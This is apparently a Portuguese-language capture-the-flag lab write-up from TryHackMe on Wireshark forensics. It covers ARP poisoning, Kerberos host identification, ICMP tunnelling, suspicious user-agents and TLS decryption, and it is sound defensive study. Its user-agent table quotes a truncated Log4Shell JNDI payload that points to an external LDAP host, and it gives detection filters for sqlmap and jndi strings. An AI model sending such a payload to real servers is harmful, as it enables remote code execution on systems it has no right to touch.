# Wireshark: Traffic Analysis

**Plataforma:** TryHackMe  
**Categoria:** Network Forensics / Traffic Analysis  
**Dificuldade:** Intermediário  
**Status:** Concluído ✅

---

## Objetivo

Utilizar o Wireshark para identificar anomalias e investigar eventos de segurança no nível de pacotes, aplicando filtros específicos para detectar diferentes tipos de ataques em capturas de tráfego de rede.

---

## Ferramentas Utilizadas

- Wireshark (análise de pacotes e filtros)
- CyberChef (decodificação Base64)

---

## Técnicas Investigadas

### 1. ARP Poisoning / MITM (Man In The Middle)

**Contexto:** O protocolo ARP não possui autenticação, o que permite que um atacante envie respostas ARP falsas para associar seu MAC a um IP legítimo (geralmente o gateway).

**Detecção:**

Filtros utilizados:
```
arp.duplicate-address-detected
arp.opcode == 1
((arp) && (arp.opcode == 1)) && (arp.src.hw_mac == target-mac-address)
```

**Evidências encontradas:**

| Elemento | MAC | IP |
|---|---|---|
| Atacante | `00:0c:29:e2:18:b4` | `192.168.1.25` |
| Gateway (legítimo) | `50:78:b3:f3:cd:f4` | `192.168.1.1` |
| Vítima | `00:0c:29:98:c7:a8` | `192.168.1.12` |

O atacante enviou respostas ARP afirmando ser o gateway (`192.168.1.1`), redirecionando todo o tráfego da vítima para sua máquina. Isso foi confirmado ao adicionar a coluna de MAC na packet list — todos os pacotes HTTP da vítima tinham como destino o MAC do atacante.

**MITRE ATT&CK:** T1557.002 — ARP Cache Poisoning

---

### 2. Identificação de Hosts (DHCP, NBNS, Kerberos)

**Contexto:** Em redes corporativas, é possível identificar hosts e usuários sem acesso ao Active Directory, analisando protocolos de rede específicos.

**Filtros e campos relevantes:**

| Protocolo | Filtro | Campo de interesse |
|---|---|---|
| DHCP | `dhcp.option.dhcp == 3` | Option 12 (hostname), Option 61 (MAC) |
| NBNS | `nbns.name contains "keyword"` | Nome NetBIOS do host |
| Kerberos | `kerberos.CNameString and !(kerberos.CNameString contains "$")` | Nome do usuário autenticado |

**Evidências encontradas (exercício Kerberos):**

- Usuário `u5` identificado via `kerberos.CNameString contains "u5"`
- IP do usuário: `10.1.12.2` (origem do AS-REQ, pacote 19)
- Hostname da máquina: `XP1` (campo NetBIOS Address no HostAddress do pacote Kerberos)

> **Observação:** Valores terminados em `$` no campo CNameString indicam contas de computador, não usuários. Filtrar com `!(kerberos.CNameString contains "$")` isola apenas usuários humanos.

---

### 3. ICMP Tunneling

**Contexto:** O protocolo ICMP normalmente carrega poucos bytes de dados (32–56 bytes). Payloads anormalmente grandes podem indicar que outro protocolo está sendo tunelado dentro dos pacotes ICMP — técnica usada para exfiltração de dados ou comunicação C2.

**Detecção:**

```
icmp and data.len > 64
```

**Evidências encontradas:**

- Pacotes ICMP com 1028 bytes de dados (muito acima do normal)
- Payload em ASCII exibia sequência `!"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ...` — padrão de negociação de sessão SSH
- Header IP (`0x45`) presente no início do payload, confirmando encapsulamento de IP dentro do ICMP

**Protocolo tunelado:** SSH

**MITRE ATT&CK:** T1095 — Non-Application Layer Protocol

---

### 4. Anomalias em User-Agents HTTP

**Contexto:** Ferramentas de ataque geralmente se identificam pelo campo `User-Agent` nas requisições HTTP. Identificar user-agents anômalos permite detectar reconhecimento, fuzzing, injeção SQL e exploits.

**Filtro utilizado:**
```
http.user_agent
```
Aplicado como coluna na packet list para visualizar todos os tipos distintos.

**6 user-agents anômalos identificados:**

| # | User-Agent | Tipo de Ameaça |
|---|---|---|
| 1 | `Mozilla/5.0 (compatible; Nmap Scripting Engine)` | Scanner de rede disfarçado |
| 2 | `Wfuzz/2.4` | Fuzzer web (força bruta) |
| 3 | `sqlmap/1.4#stable` | Ferramenta de SQL Injection |
| 4 | `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}` | Exploit Log4Shell (CVE-2021-44228) |
| 5 | `Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/...` | User-agent de ferramenta de ataque |
| 6 | `Mozllla/5.0` (L duplo) | User-agent falsificado (typosquatting) |

**Análise do Log4Shell (pacote 41):**

O payload Base64 extraído do campo User-Agent foi decodificado via CyberChef e revelou um comando `wget` apontando para um servidor externo — indicando tentativa de download de payload remoto.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

### 5. Descriptografia de Tráfego TLS + Export de Artefatos

**Contexto:** Tráfego HTTPS é opaco por padrão. Com acesso ao arquivo de chaves de sessão (`KeysLogFile.txt`), o Wireshark consegue descriptografar o tráfego TLS e expor o conteúdo HTTP2 subjacente.

**Processo:**

1. Configurar o KeysLogFile em `Edit → Preferences → Protocols → TLS`
2. Aplicar filtro `http2` para visualizar o tráfego descriptografado
3. Navegar até frames específicos para inspecionar headers de autoridade
4. Exportar artefatos via `File → Export Objects → HTTP`

**Evidências encontradas:**

- Frame 16: Client Hello direcionado a `accounts.google.com`
- 115 pacotes HTTP2 após descriptografia
- Frame 322: header de autoridade `safebrowsing.googleapis.com`
- Export Objects revelou arquivo contendo a flag do desafio

> **Lição principal:** Descriptografar tráfego é apenas o primeiro passo. O conteúdo real está nos objetos transferidos — arquivos, imagens, dados — que precisam ser inspecionados como em qualquer investigação HTTP.

---

## Filtros de Referência Rápida

```wireshark
# ARP
arp.duplicate-address-detected
arp.opcode == 1

# Identificação de hosts
dhcp.option.dhcp == 3
nbns.name contains "keyword"
kerberos.CNameString and !(kerberos.CNameString contains "$")

# ICMP Tunneling
icmp and data.len > 64

# User-Agent
http.user_agent
http.user_agent contains "sqlmap"
frame contains "jndi"

# TLS / HTTP2
http2
```

---

## Conclusão

A room demonstrou que análise de tráfego eficaz exige mais do que conhecer filtros — exige raciocínio investigativo: identificar o que é normal para cada protocolo, reconhecer desvios e correlacionar evidências de múltiplas camadas. Cada protocolo tem seu padrão legítimo; qualquer desvio é um ponto de investigação.